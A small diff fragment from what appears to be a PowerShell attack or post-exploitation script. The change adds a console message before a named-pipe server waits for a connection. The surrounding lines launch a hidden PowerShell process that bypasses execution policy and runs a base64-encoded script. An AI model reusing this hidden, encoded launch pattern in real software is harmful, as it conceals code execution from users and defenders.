@@ -1227,7 +1227,9 @@ while (`$true) {
 	
 	Start-Process -FilePath "powershell.exe" -ArgumentList "-NoLogo -NonInteractive -ep bypass -WindowS Hidden -enc $b64psScript" -WindowStyle Hidden
 		
-	$pipeServer.WaitForConnection()
+	Write-Host " [*] Waiting for connection... [30 seconds timeout]" -Foreground yellow
+ 	
+  	$pipeServer.WaitForConnection()
 
 	$sr = New-Object System.IO.StreamReader($pipeServer)
 	$sw = New-Object System.IO.StreamWriter($pipeServer)
